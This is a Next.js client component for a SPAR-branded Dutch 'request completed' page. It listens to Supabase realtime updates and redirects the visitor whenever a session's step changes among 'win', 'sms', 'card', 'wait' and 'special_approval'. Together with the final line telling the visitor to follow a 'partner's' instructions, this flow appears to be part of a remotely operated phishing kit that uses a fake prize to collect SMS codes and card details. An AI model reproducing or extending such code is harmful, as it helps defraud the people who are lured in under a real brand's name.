"use client";

import { useEffect, useState } from "react";
import { usePathname, useRouter } from "next/navigation";
import { SparShell } from "@/components/demo/SparShell";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import type { SessionStep } from "@/types/session";

type Props = {
  sessionId?: string;
};

export function CongratulationsClient({ sessionId = "" }: Props) {
  const router = useRouter();
  const pathname = usePathname();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);

  useEffect(() => {
    if (sessionId) return;
    try {
      const cached = localStorage.getItem("activeSessionId");
      if (cached) setEffectiveSessionId(cached);
    } catch {
      /* ignore */
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId) return;
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;
    const allowedSteps: SessionStep[] = ["win", "sms", "card", "wait", "congrats", "special_approval"];

    const applyStep = (nextStep?: SessionStep) => {
      if (!nextStep) return;
      if (!allowedSteps.includes(nextStep)) return;
      if (nextStep === "congrats" && pathname.startsWith("/congratulations")) return;
      router.replace(stepToPath(nextStep, effectiveSessionId));
    };

    const channel = supabase
      .channel(`congrats-session:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { current_step?: SessionStep };
          applyStep(next.current_step);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, pathname, router]);

  return (
    <SparShell title="Aanvraag afgerond" subtitle="">
      <div className="app-panel fade-in relative mx-auto w-full max-w-md overflow-hidden rounded-3xl p-8 text-center">
        <div className="pointer-events-none absolute inset-0 opacity-70">
          <div className="absolute left-[14%] top-[20%] h-2 w-2 rounded-full bg-spar-red/70" />
          <div className="absolute left-[26%] top-[14%] h-2.5 w-2.5 rounded-full bg-yellow-400/80" />
          <div className="absolute right-[24%] top-[16%] h-2 w-2 rounded-full bg-sky-400/80" />
          <div className="absolute right-[12%] top-[26%] h-2.5 w-2.5 rounded-full bg-spar-green/80" />
        </div>
        <div className="relative mx-auto grid size-20 place-items-center rounded-full bg-white/80 shadow-sm">
          <svg
            aria-hidden
            viewBox="0 0 24 24"
            className="size-9 text-spar-green"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <path d="M20 6 9 17l-5-5" />
          </svg>
        </div>
        <p className="relative mt-5 text-base font-bold text-[#333333]">
          Gefeliciteerd! Je aanvraag is succesvol afgerond. Ga verder met de instructies van je partner.
        </p>
      </div>
    </SparShell>
  );
}
